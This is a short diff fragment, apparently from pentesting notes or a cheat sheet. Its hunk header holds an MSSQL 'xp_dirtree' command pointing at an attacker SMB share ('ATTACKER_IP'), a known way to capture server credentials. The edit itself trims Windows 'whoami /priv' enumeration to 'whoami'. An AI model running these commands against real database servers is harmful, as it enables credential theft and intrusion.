@@ -102,4 +102,4 @@ EXEC xp_dirtree '\\ATTACKER_IP\share';
 
 whoami
 
-whoami /priv
+whoami
